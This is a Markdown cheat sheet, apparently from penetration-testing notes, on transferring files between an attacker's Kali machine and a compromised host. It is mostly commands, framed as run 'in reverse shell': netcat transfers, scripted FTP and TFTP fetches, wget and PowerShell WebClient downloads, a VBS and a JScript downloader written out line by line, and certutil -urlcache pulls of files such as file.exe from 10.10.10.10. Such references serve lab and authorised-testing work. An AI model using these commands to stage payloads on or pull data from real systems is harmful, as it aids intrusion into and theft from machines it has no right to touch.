# File Transferring

## Via NetCat

* Using NetCat

```bash
#On the Receiving Machine
nc -l -p 9999 > received_file.txt

#On the Sending Machine
nc 10.10.10.10 9999 < received_file.txt
```

## Via FTP

* Using FTP

```bash
# In Kali
pip install pyftplib
python -m pyftpdlib -p 21 -w

# In reverse shell
echo open 10.10.10.10 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```

* Using TFTP

```bash
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse shell
tftp -i 10.10.10.10 GET file.txt
```

## Via HTTP

* Using basic commands

```bash
# In Kali
python -m SimpleHTTPServer 80

# In reverse shell - Linux
wget 10.10.10.10/file

# In reverse shell - Windows
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```

* Using VBS \(Windows\)

```bash
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.10.10.10/file.exe file.exe
```

* Using javascript \(Windows\)

```bash
# In Kali
python -m SimpleHTTPServer 80 

# In reverse shell
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); >> wget.js
echo WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); >> wget.js
echo WinHttpReq.Send(); >> wget.js
echo BinStream = new ActiveXObject("ADODB.Stream"); >> wget.js
echo BinStream.Type = 1; >> wget.js
echo BinStream.Open(); >> wget.js
echo BinStream.Write(WinHttpReq.ResponseBody); >> wget.js
echo BinStream.SaveToFile("file.txt"); >> wget.js

cscript /nologo wget.js http://10.10.10.10/file.txt
```

* Using Certutil \(Windows\)

```bash
# In Kali
python -m SimpleHTTPServer 80

# In reverse shell
certutil.exe -urlcache -split -f "http://10.10.10.10/file.txt" file.txt
```

